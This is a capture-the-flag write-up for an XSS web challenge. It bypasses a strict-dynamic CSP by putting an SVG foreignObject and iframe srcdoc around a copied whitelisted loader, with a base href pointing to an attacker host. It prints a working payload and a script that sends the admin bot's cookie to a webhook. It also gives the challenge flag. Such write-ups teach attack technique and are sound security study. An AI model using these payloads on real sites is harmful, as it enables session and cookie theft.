---
layout: challenge.njk
title: none
category: Web
part: Quals
points: 856
setter: dimas
author: faizath
flag: "GEMASTIK18{ijo_ijo_...ijo_ijo!_warnane_gemastik!}"
flagTeaser: "GEMASTIK18{ijo_ijo...}"
description: "“Assume this website doesn't exist.” An XSS challenge with a strict <code>strict-dynamic</code> CSP and an admin bot that carries the flag in its cookie."
attachments:
  - { name: index.html, path: /files/quals/none/index.html }
  - { name: main.js, path: /files/quals/none/main.js }
tags: [xss, csp, strict-dynamic, foreignObject]
---

## Overview

We are given a public web page and an admin bot at `/report/` that visits any URL we submit. The
goal is to steal the flag, which is stored as a cookie in the admin/bot session.

## Analysis

Playing with the main page's parameters, the `?svg=` parameter is rendered straight into an `<svg>`
element via `innerHTML`. DevTools also shows a strict CSP delivered through a
`<meta http-equiv="Content-Security-Policy">` tag with `script-src 'strict-dynamic' 'sha256-…'`.

The implication: all inline scripts, event handlers (`onerror`/`onload`), and even parser-inserted
`<script>` tags are blocked — **except** for one specific inline loader whose hash is whitelisted.
Naive payloads like `<img onerror>` or `<script>alert(1)</script>` fail automatically. A second
attempt using a `data:`/`srcdoc` iframe also failed, because the child document inherits the
parent's CSP.

The key insight rests on two facts:

1. The XSS sink is `innerHTML` into `<svg>`, so we may inject a `<foreignObject>` that then contains
   ordinary HTML.
2. The CSP allows one specific whitelisted inline loader (via SHA-256), and because of
   `'strict-dynamic'`, any `<script>` created *by that trusted loader* is trusted too.

So we build an `<iframe srcdoc>` inside a `<foreignObject>`, and place inside it an inline loader
that is **byte-for-byte identical** to the whitelisted one. To make that loader fetch *our*
JavaScript, we add a `<base href="https://ATTACKER-HOST/">` so that `./modules/main.js` resolves to
our server. Because `srcdoc` inherits the parent origin, the loaded script runs same-origin with
the page and can read `parent.document.cookie`. Exfiltration is done via an image beacon to a
webhook.

## Exploitation

Exfiltration script hosted on the attacker server (e.g. `https://faiz.at/modules/main.js`):

```js
// modules/main.js on the attacker host
new Image().src =
  "https://webhook.site/1b482f28-7408-4925-8d88-cd88ae2aaafe?c=" +
  encodeURIComponent(parent.document.cookie);
```

The payload injected through `?svg=`. The `<script>…</script>` block must be identical (spaces and
newlines included) to the whitelisted inline loader on the target page:

```html
<foreignObject x="0" y="0" width="420" height="260">
  <iframe srcdoc='<!doctype html><html><head>
<meta charset="utf-8">
<base href="https://faiz.at/">
</head><body>
<script>
    const SCRIPTS = [
        "./modules/main.js",
    ]
    for (let src of SCRIPTS) {
        const script = document.createElement("script")
        script.src = src
        document.head.appendChild(script)
    }
</script>
</body></html>'></iframe>
</foreignObject>
```

The whole payload is URL-encoded and set as the `svg` value. Practically, from the console:

```js
const payload = `<foreignObject x="0" y="0" width="420" height="260">
  <iframe srcdoc='<!doctype html><html><head>
<meta charset="utf-8">
<base href="https://faiz.at/">
</head><body>
<script>
    const SCRIPTS = [
        "./modules/main.js",
    ]
    for (let src of SCRIPTS) {
        const script = document.createElement("script")
        script.src = src
        document.head.appendChild(script)
    }
</script>
</body></html>'></iframe>
</foreignObject>`;

location = "/?svg=" + encodeURIComponent(payload);
```

Once the payload is verified locally (no CSP errors in the console, and our script actually loads),
we submit the same URL to the bot via the `report` endpoint. When the bot visits it,
`modules/main.js` from our domain executes same-origin inside the `srcdoc`, reads
`parent.document.cookie`, and beacons it to the webhook.

The webhook receives a GET request with `c=<cookie>`, containing the flag. In a typical challenge
deployment the admin bot runs with the flag injected into the cookie/origin; because our JavaScript
runs same-origin (the `srcdoc` inherits the origin and the loader is allowed via
`hash + 'strict-dynamic'`), reading the cookie and exfiltrating it is trivial.
